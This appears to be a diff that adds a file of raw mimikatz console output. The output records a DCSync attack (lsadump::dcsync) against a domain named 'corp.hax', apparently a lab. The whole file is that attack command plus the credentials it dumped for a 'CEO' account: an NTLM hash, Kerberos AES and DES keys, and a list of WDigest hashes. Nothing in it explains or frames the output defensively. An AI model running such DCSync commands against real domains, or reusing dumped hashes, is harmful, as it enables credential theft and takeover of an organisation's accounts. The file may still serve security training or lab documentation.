@@ -1,0 +1,74 @@
+mimikatz # lsadump::dcsync /domain:corp.hax /user:CEO
+[DC] 'corp.hax' will be the domain
+[DC] 'dc1.corp.hax' will be the DC server
+[DC] 'CEO' will be the user account
+
+Object RDN           : CEO
+
+** SAM ACCOUNT **
+
+SAM Username         : CEO
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 3/27/2018 6:34:50 PM
+Object Security ID   : S-1-5-21-49103784-992175779-1724100279-1105
+Object Relative ID   : 1105
+
+Credentials:
+  Hash NTLM: f7936b185e34f8bb5ae46a6e9e2d864d
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 21f164bf5825acda97fd827721234e5b
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : CORP.HAXCEO
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 33aeca9a11ecacd3ab581b903d3c99712d1c0414a58def2c35bd32b3e020b4ae
+      aes128_hmac       (4096) : 07bd1acd70bc4ffcf9852bc24251d7f6
+      des_cbc_md5       (4096) : 4c378954d9a4b657
+
+* Primary:Kerberos *
+    Default Salt : CORP.HAXCEO
+    Credentials
+      des_cbc_md5       : 4c378954d9a4b657
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  f4acfdb34c0e54d3a9ed3af77a610270
+    02  2e7b9a57f196e264870a2de9766dc379
+    03  f4acfdb34c0e54d3a9ed3af77a610270
+    04  f4acfdb34c0e54d3a9ed3af77a610270
+    05  304a80277cae906c065fea49b8fe5ec5
+    06  304a80277cae906c065fea49b8fe5ec5
+    07  510dd2bf7e216a584d8f5fb7be71e58e
+    08  336b98d9cc928d10a4463141403344f5
+    09  e549372dd98cfd04c57ad7a017181d46
+    10  25f9975f4aec0de4b292ca257b288f08
+    11  25f9975f4aec0de4b292ca257b288f08
+    12  336b98d9cc928d10a4463141403344f5
+    13  336b98d9cc928d10a4463141403344f5
+    14  a2af87bec5664306da08945d8f959d9b
+    15  dbf0b3336a30c5725da33468a51b8fd7
+    16  0fc25936e67937c6a7569bcf7950998d
+    17  f3b179030e0dfcb5741e1924688a4c23
+    18  9fde8f7c8560ea9792dfb35d2b31b257
+    19  69a6319a2dbf372e2bf931600dfff826
+    20  9fde8f7c8560ea9792dfb35d2b31b257
+    21  4af94b8864774da1a4eb080e932458de
+    22  19e063078829260cc55db4f9073af966
+    23  4af94b8864774da1a4eb080e932458de
+    24  01d77101d930bab2596e00c1f0d4e2a6
+    25  4a530662afaab9cfa5a4a85b2006099a
+    26  361cc533f02dc922241305bcf644d870
+    27  e2737fffdcc58950cfe3d625b013722e
+    28  998f6eb016218ae8e7a3f8e3708f7201
+    29  e2737fffdcc58950cfe3d625b013722e
+
+
+mimikatz #
+
